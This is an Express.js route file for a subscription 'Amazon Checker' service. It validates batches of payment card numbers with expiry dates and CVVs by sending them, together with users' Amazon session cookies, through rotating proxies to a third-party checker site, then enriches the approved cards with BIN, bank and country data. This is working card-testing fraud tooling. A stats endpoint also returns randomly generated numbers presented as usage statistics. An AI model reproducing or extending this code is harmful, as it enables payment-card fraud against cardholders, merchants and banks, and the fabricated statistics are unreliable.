import express from 'express';
import { protect } from '../middleware/auth.js';
import User from '../models/User.js';
import Proxy from '../models/Proxy.js';
import AmazonRegionalCookie from '../models/AmazonRegionalCookie.js';
import axios from 'axios';

const router = express.Router();

// Middleware para verificar si el usuario tiene acceso a Amazon
const checkAmazonAccess = async (req, res, next) => {
  try {
    const user = await User.findById(req.user.id);
    if (!user) {
      return res.status(404).json({ message: 'Usuario no encontrado' });
    }

    // Verificar si el usuario está baneado
    if (user.role === 'baneado') {
      return res.status(403).json({ message: 'Usuario baneado' });
    }

    // Verificar si el usuario tiene plan premium o es admin
    if (user.role !== 'admin' && user.subscriptionStatus === 'free') {
      return res.status(403).json({ 
        message: 'Se requiere plan premium para usar Amazon Checker',
        requiresUpgrade: true
      });
    }

    req.userData = user;
    next();
  } catch (error) {
    res.status(500).json({ message: 'Error al verificar acceso' });
  }
};

// Guardar cookie de Amazon
router.post('/save-cookie', protect, checkAmazonAccess, async (req, res) => {
  try {
    const { cookie } = req.body;
    
    if (!cookie) {
      return res.status(400).json({ message: 'Cookie es requerida' });
    }

    // Guardar cookie en el usuario
    await User.findByIdAndUpdate(req.user.id, {
      amazonCookie: cookie,
      cookieUpdatedAt: new Date()
    });

    res.json({ 
      message: 'Cookie guardada correctamente',
      success: true 
    });
  } catch (error) {
    console.error('Error al guardar cookie:', error);
    res.status(500).json({ message: 'Error al guardar cookie' });
  }
});

// Obtener cookie de Amazon
router.get('/get-cookie', protect, checkAmazonAccess, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    
    if (!user.amazonCookie) {
      return res.status(404).json({ message: 'No hay cookie guardada' });
    }

    res.json({ 
      cookie: user.amazonCookie,
      updatedAt: user.cookieUpdatedAt
    });
  } catch (error) {
    console.error('Error al obtener cookie:', error);
    res.status(500).json({ message: 'Error al obtener cookie' });
  }
});

// Verificar tarjetas de Amazon con cookie regional
router.post('/check-regional-cards', protect, checkAmazonAccess, async (req, res) => {
  try {
    const { cards } = req.body;
    
    if (!cards || !Array.isArray(cards) || cards.length === 0) {
      return res.status(400).json({ message: 'Se requieren tarjetas para verificar' });
    }

    if (cards.length > 15) {
      return res.status(400).json({ message: 'Máximo 15 tarjetas por consulta' });
    }

    // Obtener cookie regional
    const cookieData = await AmazonRegionalCookie.findOne({ user_id: req.user.id });
    
    if (!cookieData) {
      return res.status(400).json({ message: 'No hay cookie regional guardada. Guarda una cookie primero.' });
    }

    // Validar formato de tarjetas
    const cardPattern = /^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/;
    const validCards = cards.filter(card => cardPattern.test(card));
    
    if (validCards.length === 0) {
      return res.status(400).json({ message: 'Formato inválido. Usa: cc|mm|aaaa|cvv' });
    }

    // Obtener proxy aleatorio
    const proxy = await Proxy.findOne({ isActive: true })
      .sort({ successRate: -1, lastUsed: 1 });
    
    if (!proxy) {
      return res.status(500).json({ message: 'No hay proxies disponibles para la verificación' });
    }

    // Función para verificar tarjeta con proxy usando cookie regional
    const checkCardWithProxy = async (card) => {
      const startTime = Date.now();
      try {
        const [cc, mes, ano, cvv] = card.split('|');
        
        // Configurar proxy para axios
        const proxyConfig = {
          host: proxy.host,
          port: proxy.port,
          protocol: proxy.protocol
        };
        
        if (proxy.username && proxy.password) {
          proxyConfig.auth = {
            username: proxy.username,
            password: proxy.password
          };
        }

        // Preparar payload para la API de Amazon con cookie regional
        const payload = {
          lista: card,
          cookies: cookieData.cookie
        };

        // Hacer petición con proxy
        const response = await axios.post(
          'https://ookurachk.blog/amazon/Amazon.php',
          payload,
          {
            proxy: proxyConfig,
            timeout: 30000,
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          }
        );

        const responseText = response.data;
        const responseTime = Date.now() - startTime;

        // Parsear respuesta (similar al código Python original)
        const statusMatch = responseText.match(/<span class="text-(success|danger)">(Aprovada|Reprovada|Erros)<\/span>/);
        const messageMatch = responseText.match(/<span class="text-(success|danger)">(.+?)<\/span>\s*➔\s*Tempo de resposta/s);
        const removedMatch = responseText.match(/Removido: (✅|❌)/);

        let status = "⚠️ Error";
        let response_msg = "Error al procesar la respuesta de la API";
        let removed_status = "❌ No removido";

        if (messageMatch) {
          const response_msg_raw = messageMatch[2].trim();
          if (response_msg_raw.includes("Erro ao obter acesso passkey")) {
            status = "❌ Invalid Cookies";
            response_msg = "Close and login to your account again";
          } else if (response_msg_raw.includes("Cookies não detectado")) {
            status = "❌ Invalid Cookies";
            response_msg = "Invalid cookie, please change";
          } else if (response_msg_raw.includes("Um endereço foi cadatrado")) {
            status = "⚠️ Address Required";
            response_msg = "Add address to account";
          } else if (response_msg_raw.includes("Erro interno - Amazon API")) {
            status = "⚠️ Error";
            response_msg = "Internal API Error";
          } else if (response_msg_raw.includes("Lista inválida")) {
            status = "⚠️ Error";
            response_msg = "Invalid card format";
          } else {
            if (statusMatch) {
              const status_raw = statusMatch[2];
              if (status_raw === "Aprovada") {
                status = "Approved Card!";
                response_msg = "Approved Card! ✅";
              } else if (status_raw === "Reprovada") {
                status = "Declined Card!";
                response_msg = "Declined Card! ❌";
              }
            }
          }
        }

        if (removedMatch) {
          removed_status = removedMatch[1] === "✅" ? "✅ Removido" : "❌ No removido";
        }

        // Actualizar estadísticas del proxy (éxito)
        proxy.successCount += 1;
        proxy.responseTime = responseTime;
        proxy.lastUsed = new Date();
        proxy.updateSuccessRate();
        await proxy.save();

        // Obtener información del BIN
        const binResponse = await axios.get(`https://binlist.io/lookup/${cc.substring(0, 6)}`);
        const binData = binResponse.data;

        return {
          card: card,
          status: status,
          response: response_msg,
          removed: removed_status,
          bin: {
            scheme: binData.scheme || 'UNKNOWN',
            type: binData.type || 'UNKNOWN',
            category: binData.brand || 'UNKNOWN'
          },
          country: {
            name: binData.country?.name || 'Unknown',
            emoji: binData.country?.emoji || '🌍'
          },
          bank: {
            name: binData.bank?.name || 'Unknown Bank'
          },
          processingTime: (responseTime / 1000).toFixed(4),
          proxyUsed: `${proxy.host}:${proxy.port}`
        };

      } catch (error) {
        const responseTime = Date.now() - startTime;
        
        // Actualizar estadísticas del proxy (fallo)
        proxy.failCount += 1;
        proxy.responseTime = responseTime;
        proxy.lastUsed = new Date();
        proxy.updateSuccessRate();
        await proxy.save();

        return {
          card: card,
          status: "⚠️ Error",
          response: "Error de conexión o proxy",
          removed: "❌ No removido",
          bin: {
            scheme: 'UNKNOWN',
            type: 'UNKNOWN',
            category: 'UNKNOWN'
          },
          country: {
            name: 'Unknown',
            emoji: '🌍'
          },
          bank: {
            name: 'Unknown Bank'
          },
          processingTime: (responseTime / 1000).toFixed(4),
          proxyUsed: `${proxy.host}:${proxy.port}`,
          error: error.message
        };
      }
    };

    // Procesar tarjetas con proxy
    const results = [];
    for (const card of validCards) {
      const result = await checkCardWithProxy(card);
      results.push(result);
      
      // Pequeña pausa entre verificaciones
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    res.json({
      success: true,
      results: results,
      totalCards: validCards.length,
      processedAt: new Date().toISOString()
    });

  } catch (error) {
    console.error('Error al verificar tarjetas con cookie regional:', error);
    res.status(500).json({ message: 'Error al verificar tarjetas con cookie regional' });
  }
});

// Verificar tarjetas de Amazon
router.post('/check-cards', protect, checkAmazonAccess, async (req, res) => {
  try {
    const { cards } = req.body;
    
    if (!cards || !Array.isArray(cards) || cards.length === 0) {
      return res.status(400).json({ message: 'Se requieren tarjetas para verificar' });
    }

    if (cards.length > 15) {
      return res.status(400).json({ message: 'Máximo 15 tarjetas por consulta' });
    }

    const user = await User.findById(req.user.id);
    
    if (!user.amazonCookie) {
      return res.status(400).json({ message: 'No hay cookie guardada. Guarda una cookie primero.' });
    }

    // Validar formato de tarjetas
    const cardPattern = /^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/;
    const validCards = cards.filter(card => cardPattern.test(card));
    
    if (validCards.length === 0) {
      return res.status(400).json({ message: 'Formato inválido. Usa: cc|mm|aaaa|cvv' });
    }

    // Obtener proxy aleatorio
    const proxy = await Proxy.findOne({ isActive: true })
      .sort({ successRate: -1, lastUsed: 1 });
    
    if (!proxy) {
      return res.status(500).json({ message: 'No hay proxies disponibles para la verificación' });
    }

    // Función para verificar tarjeta con proxy
    const checkCardWithProxy = async (card) => {
      const startTime = Date.now();
      try {
        const [cc, mes, ano, cvv] = card.split('|');
        
        // Configurar proxy para axios
        const proxyConfig = {
          host: proxy.host,
          port: proxy.port,
          protocol: proxy.protocol
        };
        
        if (proxy.username && proxy.password) {
          proxyConfig.auth = {
            username: proxy.username,
            password: proxy.password
          };
        }

        // Preparar payload para la API de Amazon
        const payload = {
          lista: card,
          cookies: user.amazonCookie
        };

        // Hacer petición con proxy - siempre usar la URL directa
        const response = await axios.post(
          'https://ookurachk.blog/amazon/Amazon.php',
          payload,
          {
            proxy: proxyConfig,
            timeout: 30000,
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          }
        );

        const responseText = response.data;
        const responseTime = Date.now() - startTime;

        // Parsear respuesta (similar al código Python original)
        const statusMatch = responseText.match(/<span class="text-(success|danger)">(Aprovada|Reprovada|Erros)<\/span>/);
        const messageMatch = responseText.match(/<span class="text-(success|danger)">(.+?)<\/span>\s*➔\s*Tempo de resposta/s);
        const removedMatch = responseText.match(/Removido: (✅|❌)/);

        let status = "⚠️ Error";
        let response_msg = "Error al procesar la respuesta de la API";
        let removed_status = "❌ No removido";

        if (messageMatch) {
          const response_msg_raw = messageMatch[2].trim();
          if (response_msg_raw.includes("Erro ao obter acesso passkey")) {
            status = "❌ Invalid Cookies";
            response_msg = "Close and login to your account again";
          } else if (response_msg_raw.includes("Cookies não detectado")) {
            status = "❌ Invalid Cookies";
            response_msg = "Invalid cookie, please change";
          } else if (response_msg_raw.includes("Um endereço foi cadatrado")) {
            status = "⚠️ Address Required";
            response_msg = "Add address to account";
          } else if (response_msg_raw.includes("Erro interno - Amazon API")) {
            status = "⚠️ Error";
            response_msg = "Internal API Error";
          } else if (response_msg_raw.includes("Lista inválida")) {
            status = "⚠️ Error";
            response_msg = "Invalid card format";
          } else {
            if (statusMatch) {
              const status_raw = statusMatch[2];
              if (status_raw === "Aprovada") {
                status = "Approved Card!";
                response_msg = "Approved Card! ✅";
              } else if (status_raw === "Reprovada") {
                status = "Declined Card!";
                response_msg = "Declined Card! ❌";
              }
            }
          }
        }

        if (removedMatch) {
          removed_status = removedMatch[1] === "✅" ? "✅ Removido" : "❌ No removido";
        }

        // Actualizar estadísticas del proxy (éxito)
        proxy.successCount += 1;
        proxy.responseTime = responseTime;
        proxy.lastUsed = new Date();
        proxy.updateSuccessRate();
        await proxy.save();

        // Obtener información del BIN
        const binResponse = await axios.get(`https://binlist.io/lookup/${cc.substring(0, 6)}`);
        const binData = binResponse.data;

        return {
          card: card,
          status: status,
          response: response_msg,
          removed: removed_status,
          bin: {
            scheme: binData.scheme || 'UNKNOWN',
            type: binData.type || 'UNKNOWN',
            category: binData.brand || 'UNKNOWN'
          },
          country: {
            name: binData.country?.name || 'Unknown',
            emoji: binData.country?.emoji || '🌍'
          },
          bank: {
            name: binData.bank?.name || 'Unknown Bank'
          },
          processingTime: (responseTime / 1000).toFixed(4),
          proxyUsed: `${proxy.host}:${proxy.port}`
        };

      } catch (error) {
        const responseTime = Date.now() - startTime;
        
        // Actualizar estadísticas del proxy (fallo)
        proxy.failCount += 1;
        proxy.responseTime = responseTime;
        proxy.lastUsed = new Date();
        proxy.updateSuccessRate();
        await proxy.save();

        return {
          card: card,
          status: "⚠️ Error",
          response: "Error de conexión o proxy",
          removed: "❌ No removido",
          bin: {
            scheme: 'UNKNOWN',
            type: 'UNKNOWN',
            category: 'UNKNOWN'
          },
          country: {
            name: 'Unknown',
            emoji: '🌍'
          },
          bank: {
            name: 'Unknown Bank'
          },
          processingTime: (responseTime / 1000).toFixed(4),
          proxyUsed: `${proxy.host}:${proxy.port}`,
          error: error.message
        };
      }
    };

    // Procesar tarjetas con proxy
    const results = [];
    for (const card of validCards) {
      const result = await checkCardWithProxy(card);
      results.push(result);
      
      // Pequeña pausa entre verificaciones
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    res.json({
      success: true,
      results: results,
      totalCards: validCards.length,
      processedAt: new Date().toISOString()
    });

  } catch (error) {
    console.error('Error al verificar tarjetas:', error);
    res.status(500).json({ message: 'Error al verificar tarjetas' });
  }
});

// Obtener estadísticas de Amazon
router.get('/stats', protect, checkAmazonAccess, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    
    // Simular estadísticas
    const stats = {
      totalChecks: Math.floor(Math.random() * 1000) + 100,
      approvedCards: Math.floor(Math.random() * 200) + 50,
      declinedCards: Math.floor(Math.random() * 300) + 100,
      successRate: Math.floor(Math.random() * 30) + 20,
      lastCheck: user.lastAmazonCheck || null,
      cookieStatus: user.amazonCookie ? 'Active' : 'Inactive'
    };

    res.json(stats);
  } catch (error) {
    console.error('Error al obtener estadísticas:', error);
    res.status(500).json({ message: 'Error al obtener estadísticas' });
  }
});

// Guardar cookie regional de Amazon (from Telegram bot)
router.post('/save-regional-cookie', protect, checkAmazonAccess, async (req, res) => {
  try {
    const { cookie } = req.body;
    
    if (!cookie) {
      return res.status(400).json({ message: 'Cookie es requerida' });
    }

    // Save regional cookie in database
    await AmazonRegionalCookie.updateOne(
      { user_id: req.user.id },
      { $set: { cookie: cookie } },
      { upsert: true }
    );

    res.json({ 
      message: 'Cookie regional guardada correctamente',
      success: true 
    });
  } catch (error) {
    console.error('Error al guardar cookie regional:', error);
    res.status(500).json({ message: 'Error al guardar cookie regional' });
  }
});

// Obtener cookie regional de Amazon
router.get('/get-regional-cookie', protect, checkAmazonAccess, async (req, res) => {
  try {
    const cookieData = await AmazonRegionalCookie.findOne({ user_id: req.user.id });
    
    if (!cookieData) {
      return res.status(404).json({ message: 'No hay cookie regional guardada' });
    }

    res.json({ 
      cookie: cookieData.cookie,
      updatedAt: cookieData.updatedAt
    });
  } catch (error) {
    console.error('Error al obtener cookie regional:', error);
    res.status(500).json({ message: 'Error al obtener cookie regional' });
  }
});

export default router; 